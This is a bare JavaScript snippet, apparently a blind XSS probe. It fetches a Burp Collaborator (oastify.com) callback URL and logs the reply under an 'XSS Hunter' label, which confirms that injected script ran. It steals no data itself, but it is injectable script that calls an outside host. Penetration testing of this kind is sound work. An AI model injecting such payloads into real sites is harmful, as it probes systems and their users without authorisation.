fetch('https://wyyj5imoxv7w3td2jx0qztindej57vvk.oastify.com')
  .then(response => response.text())
  .then(data => {
    console.log('XSS Hunter Response:', data);
  })

